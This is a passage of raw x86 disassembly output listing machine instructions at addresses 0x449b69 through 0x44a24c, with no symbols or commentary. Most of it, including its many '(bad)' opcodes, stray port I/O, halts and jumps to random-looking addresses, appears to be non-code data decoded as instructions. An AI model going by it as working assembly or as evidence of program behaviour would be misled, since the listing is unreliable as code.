  449b69:	and    al,0xff
  449b6b:	add    BYTE PTR [eax],al
  449b6d:	sbb    edi,edi
  449b6f:	add    BYTE PTR [eax],al
  449b71:	sbb    al,0xff
  449b73:	add    BYTE PTR [eax],al
  449b75:	and    al,0xff
  449b77:	add    BYTE PTR [eax],al
  449b79:	sub    bh,bh
  449b7b:	add    BYTE PTR [eax],al
  449b7d:	daa    
  449b7e:	inc    DWORD PTR [eax]
  449b80:	add    BYTE PTR [eax],ah
  449b82:	inc    DWORD PTR [eax]
  449b84:	add    BYTE PTR [edi],bl
  449b86:	inc    DWORD PTR [eax]
  449b88:	add    BYTE PTR [eax],ah
  449b8a:	inc    DWORD PTR [eax]
  449b8c:	add    BYTE PTR [edi],ah
  449b8e:	inc    DWORD PTR [eax]
  449b90:	add    BYTE PTR ds:0x30505ff,ah
  449b96:	inc    DWORD PTR [eax]
  449b98:	add    BYTE PTR [edx],al
  449b9a:	call   DWORD PTR [edi+0x6a]
  449b9d:	mov    ebx,0xf9ffc0ff
  449ba2:	(bad)  
  449ba3:	mov    esp,0x74fffaed
  449ba8:	mov    DWORD PTR [edx+0x101ff],ebp
  449bae:	inc    DWORD PTR [ecx]
  449bb0:	add    DWORD PTR [eax],eax
  449bb2:	inc    DWORD PTR [eax]
  449bb4:	add    BYTE PTR ds:0x3d0000ff,dl
  449bba:	inc    DWORD PTR [edx]
  449bbc:	add    esi,DWORD PTR ds:0x4a0204ff
  449bc2:	inc    DWORD PTR ds:0x2ff3605
  449bc8:	add    BYTE PTR ds:0x3c0000ff,bh
  449bce:	inc    DWORD PTR ds:0x14ff5906
  449bd4:	outs   dx,DWORD PTR es:[esi]
  449bd6:	inc    DWORD PTR [eax+0x54]
  449bd9:	lahf   
  449bda:	call   DWORD PTR [esp+eiz*2-0x46]
  449bde:	(bad)  
  449bdf:	jp     0x449b77
  449be1:	(bad)  
  449be2:	inc    DWORD PTR [ecx]
  449be4:	add    DWORD PTR [eax],eax
  449be6:	inc    DWORD PTR [ecx]
  449be8:	add    DWORD PTR [eax],eax
  449bea:	inc    DWORD PTR [eax]
  449bec:	add    BYTE PTR [ebx],bh
  449bee:	dec    DWORD PTR [eax]
  449bf0:	push   es
  449bf1:	add    eax,0x180602ff
  449bf6:	jmp    FWORD PTR [esi+eax*8-0x62b0001]
  449bfd:	(bad)  
  449bfe:	call   DWORD PTR [eax-0x42000a2a]
  449c04:	lock (bad) 
  449c06:	call   FWORD PTR [ecx-0x6c000419]
  449c0c:	loope  0x449c08
  449c0e:	inc    ebx
  449c10:	lock (bad) 
  449c12:	(bad)  
  449c13:	mov    ebx,0xc7ffffea
  449c18:	hlt    
  449c19:	(bad)  
  449c1a:	jmp    FWORD PTR [ebx+0x12ffffc8]
  449c20:	das    
  449c21:	outs   dx,BYTE PTR ds:[esi]
  449c22:	(bad)  
  449c23:	jp     0x449bc3
  449c25:	mov    esp,0xfff7abff
  449c2a:	jmp    FWORD PTR [ecx-0x3a000111]
  449c30:	idiv   bh
  449c32:	dec    ebx
  449c34:	stc    
  449c35:	(bad)  
  449c36:	call   esi
  449c38:	cli    
  449c39:	(bad)  
  449c3a:	dec    ebx
  449c3c:	cmc    
  449c3d:	(bad)  
  449c3e:	dec    eax
  449c40:	stc    
  449c41:	(bad)  
  449c42:	call   DWORD PTR [edx]
  449c44:	sbb    BYTE PTR [edi+edi*8],bh
  449c47:	add    DWORD PTR [ecx],eax
  449c49:	add    bh,bh
  449c4b:	add    BYTE PTR [eax],al
  449c4d:	inc    DWORD PTR es:[eax]
  449c50:	add    BYTE PTR [edi],ah
  449c52:	inc    DWORD PTR [eax]
  449c54:	add    BYTE PTR [esi],ah
  449c56:	inc    DWORD PTR [eax]
  449c58:	add    BYTE PTR ds:0x280000ff,ah
  449c5e:	inc    DWORD PTR [eax]
  449c60:	add    BYTE PTR ds:0x230000ff,ah
  449c66:	inc    DWORD PTR [eax]
  449c68:	add    BYTE PTR [eax],ah
  449c6a:	inc    DWORD PTR [eax]
  449c6c:	add    BYTE PTR [ebx],bl
  449c6e:	inc    DWORD PTR [eax]
  449c70:	add    BYTE PTR ds:0x220000ff,bl
  449c76:	inc    DWORD PTR [eax]
  449c78:	add    BYTE PTR [ebx],ah
  449c7a:	inc    DWORD PTR [eax]
  449c7c:	add    BYTE PTR [ecx],ah
  449c7e:	inc    DWORD PTR [eax]
  449c80:	add    BYTE PTR [esi],bl
  449c82:	inc    DWORD PTR [eax]
  449c84:	add    BYTE PTR [edi],bl
  449c86:	inc    DWORD PTR [eax]
  449c88:	add    BYTE PTR [ecx],ah
  449c8a:	inc    DWORD PTR [eax]
  449c8c:	add    BYTE PTR [edi],bl
  449c8e:	inc    DWORD PTR [ebx+eax*1]
  449c91:	push   ss
  449c92:	inc    DWORD PTR [eax]
  449c94:	add    BYTE PTR [eax],al
  449c96:	jmp    FWORD PTR [ecx]
  449c98:	ss js  0x449c9a
  449c9b:	mov    bh,0xe8
  449c9d:	idiv   bh
  449c9f:	pop    ebp
  449ca0:	mov    ebp,0xba2dffc9
  449ca5:	(bad)  
  449ca6:	jmp    DWORD PTR [ebx+ebp*8-0x2b5b000e]
  449cad:	(bad)  
  449cae:	call   DWORD PTR [edx+0x74]
  449cb1:	test   eax,0x6b0202ff
  449cb6:	dec    eax
  449cb8:	clc    
  449cb9:	(bad)  
  449cba:	call   edx
  449cbc:	stc    
  449cbd:	(bad)  
  449cbe:	dec    ebp
  449cc0:	clc    
  449cc1:	(bad)  
  449cc2:	dec    esi
  449cc4:	stc    
  449cc5:	(bad)  
  449cc6:	inc    ebp
  449cc8:	clc    
  449cc9:	(bad)  
  449cca:	inc    edi
  449ccc:	clc    
  449ccd:	(bad)  
  449cce:	dec    edi
  449cd0:	stc    
  449cd1:	(bad)  
  449cd2:	call   ecx
  449cd4:	stc    
  449cd5:	(bad)  
  449cd6:	inc    ebx
  449cd8:	stc    
  449cd9:	hlt    
  449cda:	call   eax
  449cdc:	push   eax
  449cde:	dec    DWORD PTR [eax+0x1ffffa1]
  449ce4:	add    DWORD PTR [eax],eax
  449ce6:	inc    DWORD PTR [eax]
  449ce8:	add    BYTE PTR [edx],bh
  449cea:	inc    DWORD PTR [eax]
  449cec:	add    BYTE PTR [edx],bh
  449cee:	inc    DWORD PTR [eax]
  449cf0:	add    BYTE PTR [eax-0x1],al
  449cf3:	add    al,BYTE PTR [edx]
  449cf5:	add    edi,edi
  449cf7:	or     DWORD PTR [esi],ecx
  449cf9:	adc    bh,bh
  449cfb:	(bad)  
  449cfc:	hlt    
  449cfd:	(bad)  
  449cfe:	dec    DWORD PTR [edi-0x54]
  449d01:	out    0xff,al
  449d03:	sbb    eax,0x2affd39d
  449d08:	mov    esi,0xb41fffdb
  449d0d:	aad    0xff
  449d0f:	cmp    eax,edx
  449d11:	loopne 0x449d12
  449d13:	inc    eax
  449d14:	scas   eax,DWORD PTR es:[edi]
  449d15:	sar    bh,cl
  449d17:	cmp    DWORD PTR [eax-0x327d0045],edx
  449d1d:	(bad)  
  449d1f:	fs (bad) 
  449d21:	loopne 0x449d22
  449d23:	sbb    DWORD PTR ds:0xbb57ff72,edi
  449d29:	loope  0x449d2a
  449d2b:	sub    ch,BYTE PTR [esi-0x41a0003a]
  449d31:	fcos   
  449d33:	outs   dx,BYTE PTR ds:[esi]
  449d34:	leave  
  449d35:	jecxz  0x449d36
  449d37:	enterw 0xffe3,0x41
  449d3c:	test   eax,0xf8ccffd9
  449d41:	(bad)  
  449d42:	dec    esp
  449d44:	stc    
  449d45:	(bad)  
  449d46:	dec    DWORD PTR [edx]
  449d48:	or     DWORD PTR [ecx],edi
  449d4a:	inc    DWORD PTR [ecx]
  449d4c:	add    DWORD PTR [eax],eax
  449d4e:	inc    DWORD PTR [ecx]
  449d50:	add    DWORD PTR [eax],eax
  449d52:	inc    DWORD PTR [eax]
  449d54:	add    BYTE PTR [esi],bl
  449d56:	inc    DWORD PTR [eax]
  449d58:	add    BYTE PTR [edx],ah
  449d5a:	inc    DWORD PTR [eax]
  449d5c:	add    BYTE PTR [edx],ah
  449d5e:	inc    DWORD PTR [eax]
  449d60:	add    BYTE PTR [ebx],ah
  449d62:	inc    DWORD PTR [eax]
  449d64:	add    BYTE PTR [ecx],ah
  449d66:	inc    DWORD PTR [eax]
  449d68:	add    BYTE PTR [ecx],ah
  449d6a:	inc    DWORD PTR [eax]
  449d6c:	add    BYTE PTR [edx],bl
  449d6e:	inc    DWORD PTR [eax]
  449d70:	add    BYTE PTR [edx],bl
  449d72:	inc    DWORD PTR [eax]
  449d74:	add    BYTE PTR [edx],ah
  449d76:	inc    DWORD PTR [eax]
  449d78:	add    BYTE PTR [eax],ah
  449d7a:	inc    DWORD PTR [eax]
  449d7c:	add    BYTE PTR [edx],ah
  449d7e:	inc    DWORD PTR [eax]
  449d80:	add    BYTE PTR [ecx],ah
  449d82:	inc    DWORD PTR [eax]
  449d84:	add    BYTE PTR ds:0x230000ff,bl
  449d8a:	dec    DWORD PTR [ebx]
  449d8c:	or     DWORD PTR [edx],ebx
  449d8e:	inc    DWORD PTR [eax]
  449d90:	add    BYTE PTR [eax],al
  449d92:	jmp    FWORD PTR [edi]
  449d94:	dec    edx
  449d95:	jl     0x449d96
  449d97:	leave  
  449d98:	repnz (bad) 
  449d9a:	dec    DWORD PTR [esi+0x66ffd8d2]
  449da0:	xlat   BYTE PTR ds:[ebx]
  449da1:	(bad)  
  449da3:	adc    al,0xa1
  449da5:	mov    edi,0xcdbc1eff
  449daa:	inc    ecx
  449dac:	(bad)  
  449dad:	repz push DWORD PTR [ebx-0x6f]
  449db1:	into   
  449db2:	call   DWORD PTR [ecx]
  449db4:	adc    al,0x5c
  449db6:	dec    DWORD PTR [edx+0x4cffdfd9]
  449dbc:	rcr    ecx,1
  449dbe:	jmp    DWORD PTR [esi-0x30]
  449dc1:	int3   
  449dc2:	call   FWORD PTR [edi-0x2a]
  449dc5:	fcos   
  449dc7:	pop    edx
  449dc8:	fstp   st(2)
  449dca:	call   DWORD PTR [ebx-0x69002911]
  449dd0:	out    0xd4,al
  449dd2:	call   DWORD PTR [ecx-0x7d001a15]
  449dd8:	in     eax,0xd6
  449dda:	jmp    FWORD PTR [ebp+0x1fff3de]
  449de0:	add    DWORD PTR [eax],eax
  449de2:	inc    DWORD PTR [ecx]
  449de4:	add    DWORD PTR [eax],eax
  449de6:	inc    DWORD PTR [eax]
  449de8:	add    BYTE PTR [ebx],bh
  449dea:	inc    DWORD PTR [eax]
  449dec:	add    BYTE PTR [edx],dh
  449dee:	inc    DWORD PTR [eax]
  449df0:	add    BYTE PTR [eax],bh
  449df2:	inc    DWORD PTR [eax]
  449df4:	add    BYTE PTR ds:0xff,bh
  449dfa:	inc    DWORD PTR ds:0x3dff0a08
  449e00:	dec    edx
  449e01:	dec    esp
  449e02:	jmp    DWORD PTR [edx-0x40]
  449e05:	hlt    
  449e06:	jmp    FWORD PTR [esi]
  449e08:	mov    dl,0xde
  449e0a:	jmp    FWORD PTR [edx]
  449e0c:	cdq    
  449e0d:	retf   0x29ff
  449e10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449e11:	sar    edi,1
  449e13:	das    
  449e14:	mov    al,ds:0xb744ffca
  449e19:	(bad)  
  449e1a:	jmp    FWORD PTR [edx]
  449e1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449e1d:	sar    bh,1
  449e1f:	sub    DWORD PTR [ecx+0x7f2bffda],ebp
  449e25:	mov    eax,0xdbc583ff
  449e2a:	dec    DWORD PTR [edx-0x2d]
  449e2d:	in     al,0xff
  449e2f:	push   edi
  449e30:	fcomp  st(5)
  449e32:	call   DWORD PTR [ebx-0x3f]
  449e35:	fdivr  st,st(7)
  449e37:	dec    edx
  449e38:	mov    edx,0xc454ffdc
  449e3d:	jecxz  0x449e3e
  449e3f:	lods   al,BYTE PTR ss:[esi]
  449e41:	jecxz  0x449e42
  449e43:	jae    0x449e0d
  449e45:	stc    
  449e46:	inc    ebx
  449e48:	clc    
  449e49:	(bad)  
  449e4a:	inc    DWORD PTR [eax]
  449e4c:	add    BYTE PTR [eax],cl
  449e4e:	inc    DWORD PTR [ecx]
  449e50:	add    DWORD PTR [eax],eax
  449e52:	inc    DWORD PTR [eax]
  449e54:	add    BYTE PTR [eax],al
  449e56:	inc    DWORD PTR [ebx]
  449e58:	add    ebx,DWORD PTR [edi+edi*8]
  449e5b:	add    BYTE PTR [eax],al
  449e5d:	and    edi,edi
  449e5f:	add    BYTE PTR [eax],al
  449e61:	and    bh,bh
  449e63:	add    BYTE PTR [eax],al
  449e65:	and    bh,bh
  449e67:	add    BYTE PTR [eax],al
  449e69:	and    bh,bh
  449e6b:	add    BYTE PTR [eax],al
  449e6d:	push   ss
  449e6e:	inc    DWORD PTR [eax]
  449e70:	add    BYTE PTR [ecx],bl
  449e72:	inc    DWORD PTR [eax]
  449e74:	add    BYTE PTR [edi],bl
  449e76:	inc    DWORD PTR [eax]
  449e78:	add    BYTE PTR [eax],ah
  449e7a:	inc    DWORD PTR [eax]
  449e7c:	add    BYTE PTR [ebx],ah
  449e7e:	inc    DWORD PTR [eax]
  449e80:	add    BYTE PTR [edi],bl
  449e82:	inc    DWORD PTR [eax]
  449e84:	add    BYTE PTR [ebx],bl
  449e86:	inc    DWORD PTR [esi]
  449e88:	add    al,0x2
  449e8a:	inc    DWORD PTR [eax]
  449e8c:	add    BYTE PTR [eax],al
  449e8e:	call   DWORD PTR [esp+eiz*2-0x7e]
  449e92:	push   DWORD PTR [ecx+0x4ffffef0]
  449e98:	mov    ds:0xc46bffc4,eax
  449e9d:	jecxz  0x449e9e
  449e9f:	push   0xffffffdc
  449ea1:	(bad)  
  449ea3:	push   ds
  449ea4:	lods   al,BYTE PTR ds:[esi]
  449ea5:	(bad)  
  449ea6:	call   DWORD PTR [eax]
  449ea8:	ret    
  449ea9:	aad    0xff
  449eab:	ret    
  449eac:	in     eax,dx
  449ead:	cmc    
  449eae:	jmp    DWORD PTR [esi]
  449eb0:	and    eax,DWORD PTR [edi-0x1]
  449eb3:	cmp    al,BYTE PTR [edx+ebx*2-0x1]
  449eb7:	jge    0x449e8b
  449eb9:	(bad)  
  449ebb:	sbb    ebp,DWORD PTR [esi-0x43b60037]
  449ec1:	sar    edi,1
  449ec3:	dec    edx
  449ec4:	int3   
  449ec5:	fdivp  st(7),st
  449ec7:	das    
  449ec8:	retf   
  449ec9:	loope  0x449eca
  449ecb:	push   eax
  449ecc:	rcr    cl,1
  449ece:	push   DWORD PTR ds:0x54ffd1c0
  449ed4:	rcl    edi,0xff
  449ed7:	mov    ch,dh
  449ed9:	out    0xff,eax
  449edb:	retf   
  449edc:	stc    
  449edd:	(bad)  
  449ede:	inc    DWORD PTR [ecx]
  449ee0:	add    DWORD PTR [eax],eax
  449ee2:	inc    DWORD PTR [eax]
  449ee4:	add    BYTE PTR [ecx],bh
  449ee6:	inc    DWORD PTR [eax]
  449ee8:	add    BYTE PTR [edi],ch
  449eea:	inc    DWORD PTR [eax]
  449eec:	add    BYTE PTR [edi+edi*8],dh
  449eef:	add    BYTE PTR [eax],al
  449ef1:	cmp    edi,edi
  449ef3:	add    BYTE PTR [eax],al
  449ef5:	cmp    bh,bh
  449ef7:	add    BYTE PTR [eax],al
  449ef9:	xor    edi,edi
  449efb:	add    BYTE PTR [eax],al
  449efd:	add    bh,bh
  449eff:	or     al,0x15
  449f01:	push   ds
  449f02:	call   FWORD PTR [ebp-0x6a]
  449f05:	pushf  
  449f06:	push   DWORD PTR [ecx-0x33]
  449f09:	cmc    
  449f0a:	push   DWORD PTR [ecx]
  449f0c:	scas   eax,DWORD PTR es:[edi]
  449f0d:	fdiv   st(7),st
  449f0f:	das    
  449f10:	cdq    
  449f11:	enter  0x23ff,0x85
  449f15:	(bad)  
  449f18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449f19:	mov    ebp,0xd6aa52ff
  449f1e:	call   FWORD PTR ds:0x22ffdcb2
  449f24:	xchg   ebp,eax
  449f25:	sar    bh,0x93
  449f28:	mov    eax,0xe083ffd3
  449f2d:	in     al,0xff
  449f2f:	push   ebx
  449f30:	mov    ah,0xca
  449f32:	jmp    FWORD PTR [edi-0x3a]
  449f35:	(bad)  
  449f36:	jmp    DWORD PTR [ecx-0x48]
  449f39:	(bad)  
  449f3a:	call   DWORD PTR [ecx-0x51]
  449f3d:	sar    bh,cl
  449f3f:	ins    DWORD PTR es:[edi],dx
  449f40:	enter  0xffdb,0x75
  449f44:	shl    esp,1
  449f46:	inc    DWORD PTR [ecx+0x7ffd69b]
  449f4c:	add    eax,0x7a66ff24
  449f51:	int3   
  449f52:	inc    DWORD PTR [ecx]
  449f54:	add    DWORD PTR [eax],eax
  449f56:	inc    DWORD PTR [ecx]
  449f58:	add    DWORD PTR [eax],eax
  449f5a:	inc    DWORD PTR [eax]
  449f5c:	add    BYTE PTR [ecx],ah
  449f5e:	inc    DWORD PTR [eax]
  449f60:	add    BYTE PTR [esi],bl
  449f62:	inc    DWORD PTR [eax]
  449f64:	add    BYTE PTR [esi],bl
  449f66:	inc    DWORD PTR [eax]
  449f68:	add    BYTE PTR [ecx],ah
  449f6a:	inc    DWORD PTR [eax]
  449f6c:	add    BYTE PTR [edx],bl
  449f6e:	inc    DWORD PTR [eax]
  449f70:	add    BYTE PTR [ecx],bl
  449f72:	inc    DWORD PTR [ecx]
  449f74:	add    DWORD PTR [ecx],edx
  449f76:	inc    DWORD PTR [ecx]
  449f78:	add    DWORD PTR [edi],ecx
  449f7a:	inc    DWORD PTR ds:0x1cff1204
  449f80:	sbb    dl,BYTE PTR [edi]
  449f82:	inc    DWORD PTR [eax]
  449f84:	add    BYTE PTR [eax],al
  449f86:	inc    DWORD PTR ds:0x5dff1b07
  449f8c:	outs   dx,DWORD PTR ds:[esi]
  449f8d:	fwait
  449f8e:	inc    eax
  449f90:	in     eax,dx
  449f91:	idiv   edi
  449f93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449f94:	(bad)  
  449f96:	dec    DWORD PTR [edx-0x54]
  449f99:	int3   
  449f9a:	call   FWORD PTR [ebx-0x43]
  449f9d:	(bad)  
  449f9e:	jmp    DWORD PTR [edi-0x29]
  449fa1:	loope  0x449fa2
  449fa3:	pop    ecx
  449fa4:	rcl    ebp,cl
  449fa6:	(bad)  
  449fa7:	jge    0x449f88
  449fa9:	idiv   edi
  449fab:	add    BYTE PTR [ebp+0xffa3],0x7
  449fb2:	push   DWORD PTR [esi+0x76]
  449fb5:	cdq    
  449fb6:	(bad)  
  449fb7:	jl     0x449f9a
  449fb9:	jmp    0xc6e3bbbd
  449fbe:	inc    DWORD PTR [esi-0x53]
  449fc1:	fdivr  st,st(7)
  449fc3:	push   ebx
  449fc4:	scas   eax,DWORD PTR es:[edi]
  449fc5:	xlat   BYTE PTR ds:[ebx]
  449fc6:	call   DWORD PTR [esi]
  449fc8:	scas   eax,DWORD PTR es:[edi]
  449fc9:	loop   0x449fca
  449fcb:	and    esp,DWORD PTR [eax+ebx*8-0x2448de01]
  449fd2:	call   DWORD PTR [edx+ecx*8-0x29]
  449fd6:	(bad)  
  449fd7:	mov    esp,0x1fffae0
  449fdc:	add    DWORD PTR [eax],eax
  449fde:	inc    DWORD PTR [ecx]
  449fe0:	add    DWORD PTR [eax],eax
  449fe2:	inc    DWORD PTR [eax]
  449fe4:	add    BYTE PTR [ebx],dh
  449fe6:	inc    DWORD PTR [eax]
  449fe8:	add    BYTE PTR [eax],dh
  449fea:	inc    DWORD PTR [eax]
  449fec:	add    BYTE PTR [edi],ch
  449fee:	inc    DWORD PTR [eax]
  449ff0:	add    BYTE PTR [eax],bh
  449ff2:	inc    DWORD PTR [eax]
  449ff4:	add    BYTE PTR [ebx],bh
  449ff6:	inc    DWORD PTR [eax]
  449ff8:	add    BYTE PTR ds:0x290303ff,dh
  449ffe:	inc    DWORD PTR [eax]
  44a000:	add    BYTE PTR ds:0xce9036ff,al
  44a006:	inc    DWORD PTR [eax+0x4cfffff6]
  44a00c:	mov    bl,0xeb
  44a00e:	call   FWORD PTR ds:0x1effc992
  44a014:	js     0x449fd6
  44a016:	(bad)  
  44a017:	ds xchg ecx,eax
  44a019:	mov    ebx,0xccac56ff
  44a01e:	call   DWORD PTR [edi-0x39]
  44a021:	(bad)  
  44a023:	push   cs
  44a024:	pop    edx
  44a025:	mov    cl,0xff
  44a027:	cmp    cl,BYTE PTR [esi-0x7a]
  44a02a:	inc    DWORD PTR [esi+0x5effe0d4]
  44a030:	lods   eax,DWORD PTR ds:[esi]
  44a031:	(bad)  
  44a032:	call   FWORD PTR [esi-0x4e]
  44a035:	sar    edi,cl
  44a037:	pop    ebp
  44a038:	lods   al,BYTE PTR ds:[esi]
  44a039:	int    0xff
  44a03b:	pop    esp
  44a03c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a03d:	int3   
  44a03e:	jmp    FWORD PTR [ebp-0x49]
  44a041:	sar    bh,cl
  44a043:	jp     0x44a012
  44a045:	fdiv   st(7),st
  44a047:	jae    0x44a015
  44a049:	jecxz  0x44a04a
  44a04b:	ins    BYTE PTR es:[edi],dx
  44a04c:	jno    0x44a007
  44a04e:	dec    ebx
  44a050:	clc    
  44a051:	(bad)  
  44a052:	dec    DWORD PTR [esi+0x1ffe8a6]
  44a058:	add    DWORD PTR [eax],eax
  44a05a:	inc    DWORD PTR [eax]
  44a05c:	add    BYTE PTR [edx],ch
  44a05e:	inc    DWORD PTR [eax]
  44a060:	add    BYTE PTR [ebx],bl
  44a062:	inc    DWORD PTR [eax]
  44a064:	add    BYTE PTR ds:0x1c0000ff,bl
  44a06a:	inc    DWORD PTR [eax]
  44a06c:	add    BYTE PTR [edi],dl
  44a06e:	inc    DWORD PTR [eax]
  44a070:	add    BYTE PTR [eax],bl
  44a072:	inc    DWORD PTR [edx]
  44a074:	add    DWORD PTR [ecx],eax
  44a076:	inc    DWORD PTR [eax]
  44a078:	add    BYTE PTR [edi+edi*8],dl
  44a07b:	add    al,BYTE PTR [edx]
  44a07d:	and    bh,bh
  44a07f:	and    DWORD PTR [edi],esp
  44a081:	dec    eax
  44a082:	dec    DWORD PTR [edi+0x58]
  44a085:	xchg   ebp,eax
  44a086:	inc    ecx
  44a088:	int    0xec
  44a08a:	call   eax
  44a08c:	sti    
  44a08d:	cld    
  44a08e:	jmp    FWORD PTR [eax+0x7effdbda]
  44a094:	rcr    esi,cl
  44a096:	jmp    FWORD PTR [esi-0x2e]
  44a099:	loop   0x44a09a
  44a09b:	adc    ebx,0xffffffde
  44a09e:	inc    DWORD PTR [ebp-0x48]
  44a0a1:	enter  0x36ff,0xb9
  44a0a5:	int3   
  44a0a6:	dec    esp
  44a0a8:	in     al,dx
  44a0a9:	cli    
  44a0aa:	call   FWORD PTR [eax]
  44a0ac:	push   ss
  44a0ad:	sub    al,0xff
  44a0af:	add    BYTE PTR [eax],al
  44a0b1:	add    edi,edi
  44a0b3:	xchg   DWORD PTR [ecx-0x238c002f],esp
  44a0b9:	loope  0x44a0ba
  44a0bb:	pop    ebx
  44a0bc:	ret    
  44a0bd:	xlat   BYTE PTR ds:[ebx]
  44a0be:	call   FWORD PTR [ecx-0x46]
  44a0c1:	(bad)  
  44a0c3:	push   0xffffffad
  44a0c5:	aad    0xff
  44a0c7:	popa   
  44a0c8:	int    0xe6
  44a0ca:	jmp    FWORD PTR [eax-0x1f]
  44a0cd:	out    0xff,eax
  44a0cf:	dec    ebp
  44a0d0:	mov    ebp,0xcb5effd6
  44a0d5:	sar    bh,1
  44a0d7:	popf   
  44a0d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44a0d9:	std    
  44a0da:	inc    DWORD PTR [ecx]
  44a0dc:	add    DWORD PTR [eax],eax
  44a0de:	inc    DWORD PTR ds:0xff0003
  44a0e4:	add    BYTE PTR [ecx],dh
  44a0e6:	inc    DWORD PTR [eax]
  44a0e8:	add    BYTE PTR [ebx],dh
  44a0ea:	inc    DWORD PTR [eax]
  44a0ec:	add    BYTE PTR ds:0x380000ff,dh
  44a0f2:	inc    DWORD PTR [eax]
  44a0f4:	add    BYTE PTR [edi+edi*8],bh
  44a0f7:	add    BYTE PTR [eax],al
  44a0f9:	inc    DWORD PTR ss:[eax]
  44a0fc:	add    BYTE PTR [esi],bh
  44a0fe:	inc    DWORD PTR [ecx]
  44a100:	add    DWORD PTR [eax],eax
  44a102:	call   DWORD PTR [edx]
  44a104:	das    
  44a105:	mov    bh,bh
  44a107:	gs repnz (bad) 
  44a10a:	dec    DWORD PTR [esp+eax*8-0x19]
  44a10e:	jmp    DWORD PTR [ecx]
  44a110:	mov    esp,es
  44a112:	jmp    FWORD PTR ds:0x42ffb178
  44a118:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44a119:	iret   
  44a11a:	inc    DWORD PTR [esp+edx*4-0x38]
  44a11e:	call   DWORD PTR [ecx-0x56]
  44a121:	sar    edi,cl
  44a123:	push   edx
  44a124:	mov    ebp,0x4e24ffef
  44a129:	mov    edi,edi
  44a12b:	sahf   
  44a12c:	mov    edx,0xc664ffd2
  44a131:	hlt    
  44a132:	jmp    FWORD PTR [ebx-0x39]
  44a135:	fdivp  st(7),st
  44a137:	imul   eax,eax,0xffffffda
  44a13a:	(bad)  
  44a13b:	jp     0x44a10b
  44a13d:	jecxz  0x44a13e
  44a13f:	ins    DWORD PTR es:[edi],dx
  44a140:	mov    esi,0xaf5bffd6
  44a145:	iret   
  44a146:	call   DWORD PTR [eax-0x41]
  44a149:	fcos   
  44a14b:	imul   edi,DWORD PTR [edx-0x2b7d001b],0xffffffea
  44a152:	dec    edi
  44a154:	stc    
  44a155:	(bad)  
  44a156:	jmp    DWORD PTR [ecx]
  44a158:	xor    esi,DWORD PTR [ebx+0x101ff]
  44a15e:	inc    DWORD PTR [edx]
  44a160:	add    bl,BYTE PTR [eax]
  44a162:	inc    DWORD PTR [eax]
  44a164:	add    BYTE PTR ds:0x1c0000ff,bl
  44a16a:	inc    DWORD PTR [eax]
  44a16c:	add    BYTE PTR ds:0x170000ff,dl
  44a172:	inc    DWORD PTR [ecx]
  44a174:	add    DWORD PTR [eax],eax
  44a176:	call   DWORD PTR [esi]
  44a178:	and    bh,al
  44a17a:	dec    edx
  44a17c:	stc    
  44a17d:	(bad)  
  44a17e:	dec    edx
  44a180:	idiv   eax
  44a182:	jmp    DWORD PTR [eax-0x72000008]
  44a188:	(bad)  
  44a18a:	call   FWORD PTR [edi-0x2b]
  44a18d:	iret   
  44a18e:	push   DWORD PTR [edx-0x36]
  44a191:	(bad)  
  44a193:	xor    ebp,DWORD PTR [esi-0x368d002e]
  44a199:	jecxz  0x44a19a
  44a19b:	popf   
  44a19c:	(bad)  
  44a19e:	(bad)  
  44a19f:	cmp    cl,bl
  44a1a1:	(bad)  
  44a1a3:	popa   
  44a1a4:	rcr    al,1
  44a1a6:	jmp    FWORD PTR [eax+0xffc9b5]
  44a1ac:	add    BYTE PTR [ecx],bl
  44a1ae:	dec    DWORD PTR [eax]
  44a1b0:	or     ch,BYTE PTR [edx]
  44a1b2:	call   DWORD PTR [ecx-0x6d001d3f]
  44a1b8:	(bad)
  44a1bb:	push   ebx
  44a1bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44a1bd:	ret    0x2eff
  44a1c0:	xchg   ecx,eax
  44a1c1:	mov    edi,0xdabd6bff
  44a1c6:	call   DWORD PTR [esi+ecx*8-0x26a10019]
  44a1cd:	jmp    0x55ff:0xd3b958ff
  44a1d4:	rcl    ch,1
  44a1d6:	push   DWORD PTR [edi]
  44a1d8:	dec    ebx
  44a1d9:	cmp    edi,0x1
  44a1dc:	add    DWORD PTR [eax],eax
  44a1de:	inc    DWORD PTR [ebx]
  44a1e0:	add    cl,BYTE PTR ds:0x340000ff
  44a1e6:	inc    DWORD PTR [eax]
  44a1e8:	add    BYTE PTR [eax],dh
  44a1ea:	inc    DWORD PTR [eax]
  44a1ec:	add    BYTE PTR [eax],dh
  44a1ee:	inc    DWORD PTR [eax]
  44a1f0:	add    BYTE PTR [edx],dh
  44a1f2:	inc    DWORD PTR [eax]
  44a1f4:	add    BYTE PTR [edx],dh
  44a1f6:	inc    DWORD PTR [eax]
  44a1f8:	add    BYTE PTR [edi],ch
  44a1fa:	inc    DWORD PTR [eax]
  44a1fc:	add    BYTE PTR [esi],dh
  44a1fe:	inc    DWORD PTR [ecx]
  44a200:	add    DWORD PTR [eax],eax
  44a202:	inc    DWORD PTR [ebx]
  44a204:	adc    BYTE PTR [edi-0x1],ch
  44a207:	je     0x44a1f1
  44a209:	(bad)  
  44a20a:	dec    DWORD PTR [esi-0x4e]
  44a20d:	sar    edi,1
  44a20f:	ss xchg ecx,eax
  44a211:	(bad)  
  44a214:	xchg   DWORD PTR [edi+edi*8-0x355dbe],esi
  44a21b:	xor    eax,0x33ffa467
  44a220:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a221:	fcos   
  44a223:	sub    DWORD PTR [eax-0x67],ebp
  44a226:	dec    DWORD PTR [esi]
  44a228:	and    ah,BYTE PTR [ecx]
  44a22a:	call   FWORD PTR ds:0x71ff2825
  44a230:	mov    cl,0xb9
  44a232:	call   DWORD PTR [ebp+0x65fff9ec]
  44a238:	mov    esi,0xb45cffdb
  44a23d:	xlat   BYTE PTR ds:[ebx]
  44a23e:	call   FWORD PTR [ebx-0x51]
  44a241:	sar    bh,1
  44a243:	push   esi
  44a244:	stos   BYTE PTR es:[edi],al
  44a245:	sar    edi,1
  44a247:	(bad)  
  44a248:	enter  0xffdd,0x32
  44a24c:	mov    al,al
